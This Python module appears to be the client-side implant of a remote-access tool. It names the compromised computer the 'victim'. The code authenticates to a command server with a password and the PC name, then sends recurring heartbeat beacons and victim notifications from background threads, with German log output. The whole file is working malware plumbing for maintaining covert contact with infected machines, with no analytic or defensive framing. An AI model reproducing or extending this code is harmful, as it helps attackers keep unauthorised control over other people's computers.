import threading
import time

import requests

import config # type: ignore

_authenticated = False


def authenticate() -> bool:
    global _authenticated
    try:
        r = requests.post(
            f"{config.SERVER_URL}/auth",
            json={"password": config.PASSWORD, "pc_name": config.PC_NAME},
            timeout=10,
        )
        if r.status_code == 200:
            _authenticated = True
            # Removed: Don't send system notifications, only drive requests
            return True
    except requests.exceptions.ConnectionError:
        pass
    except Exception:
        pass
    return False


def send_notification(message: str):
    """Send a notification from victim to server for client UI."""
    try:
        requests.post(
            f"{config.SERVER_URL}/send_notification",
            json={"victim_name": config.PC_NAME, "message": message},
            timeout=5,
        )
    except Exception:
        pass


def _send_heartbeat():
    try:
        requests.post(
            f"{config.SERVER_URL}/victim/heartbeat",
            json={"pc_name": config.PC_NAME},
            timeout=10,
        )
    except Exception:
        pass


def heartbeat_worker():
    print("[*] Heartbeat-Thread gestartet", flush=True)
    while True:
        try:
            threading.Thread(target=_send_heartbeat, daemon=True).start()
        except Exception as e:
            print(f"[-] Heartbeat Thread-Fehler: {e}", flush=True)
        time.sleep(config.HEARTBEAT_INTERVAL)


def auth_worker():
    global _authenticated
    print("\n" + "=" * 60, flush=True)
    print("[*] Auth-Worker gestartet", flush=True)
    print("=" * 60 + "\n", flush=True)
    retry_count = 0
    while True:
        if not _authenticated:
            retry_count += 1
            print(f"\n[*] Authentifizierungsversuch #{retry_count}...", flush=True)
            if authenticate():
                print("[+] Authentifiziert! Nächste Re-Auth in 30 Min", flush=True)
                time.sleep(1800)
                _authenticated = False
            else:
                print(f"[!] Warte {config.AUTH_RETRY_INTERVAL} Sekunden vor nächstem Versuch...", flush=True)
                time.sleep(config.AUTH_RETRY_INTERVAL)
        else:
            print(f"[DEBUG] Auth-Worker: authenticated=True, nächster Poll in 60s", flush=True)
            time.sleep(60)
